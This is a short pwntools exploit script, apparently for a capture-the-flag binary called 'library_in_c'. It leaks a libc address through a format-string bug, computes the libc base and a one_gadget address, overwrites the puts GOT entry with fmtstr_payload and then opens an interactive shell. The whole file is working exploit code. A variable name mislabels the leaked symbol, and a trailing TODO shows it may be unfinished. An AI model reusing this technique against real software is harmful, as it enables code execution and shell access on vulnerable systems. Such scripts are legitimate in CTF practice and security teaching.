from pwn import *
import struct
p = process("./library_in_c")


onegadget1 = b'0x45216'
onegadget2 = 0x4526a
onegadget3 = b'0xf02a4'
onegadget4 = 0xf1147

binary  = ELF("./library_in_c")
libc= ELF('libc.so.6')
libc_puts = libc.symbols["puts"]
got_puts = 0x00601018



def leak_libc(r):
	r.recvuntil("name?\n")
	payload = b""
	payload += b"|%10$s|".rjust(8)
	payload += b"xDXDXDXD"
	payload += struct.pack("<Q",0x00601018)
	r.sendline(payload)
	data   = p.recvuntil("xDXDXDXD")
	fgets  = data.split(b'|')[1]
	fgets  = int.from_bytes(fgets,byteorder="little")
	return fgets


libc_base = leak_libc(p)-libc_puts
one_gadget = libc_base + onegadget2

print(got_puts)
print(one_gadget)
payload = fmtstr_payload(16, {got_puts: one_gadget}, write_size='short')
print(payload)

p.recvuntil("out?\n")
p.sendline(payload)
p.interactive()

#TODO: overwrite got od necesa somehow

